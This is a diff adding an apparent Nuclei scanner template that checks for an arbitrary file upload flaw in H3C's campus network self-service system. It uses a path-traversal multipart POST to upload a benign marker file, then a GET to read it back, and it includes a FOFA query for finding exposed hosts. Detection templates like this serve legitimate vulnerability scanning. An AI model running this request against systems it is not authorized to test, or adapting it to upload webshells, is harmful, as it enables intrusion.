@@ -1,0 +1,45 @@
+id: h3c-cnsss-arbitrary-file-upload
+
+info:
+  name: H3C CNSSS - Arbitrary File Upload
+  author: s4e-io
+  severity: critical
+  description: |
+    H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.
+  reference:
+    - https://github.com/wy876/POC/blob/main/H3C-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Fflexfileupload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: header="/selfservice"
+  tags: h3c,lfi,instrusive,file-upload
+
+variables:
+  filename: "{{rand_base(10)}}"
+  num: "{{rand_int(1000, 9999)}}"
+
+http:
+  - raw:
+      - |
+        POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
+
+        -----------------WebKitFormBoundaryMmx988TUuintqO4Q
+        Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}.txt"
+        Content-Type: application/octet-stream
+
+        {{md5(num)}}
+        -----------------WebKitFormBoundaryMmx988TUuintqO4Q--
+
+      - |
+        GET /imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2,"{{md5(num)}}")'
+          - "status_code_1 == 200 && status_code_2 == 200"
+        condition: and
+# digest: 4a0a0047304502207440cbbbe520ec653191b451a270191b828f5e3bb350a3333db60c548ad35ae1022100ef3acda3abc428cca620440e9d1c8252cd4e05d3f89ba2a08996a62fcb4b5df7:922c64590222798bb761d5b6d8e72950
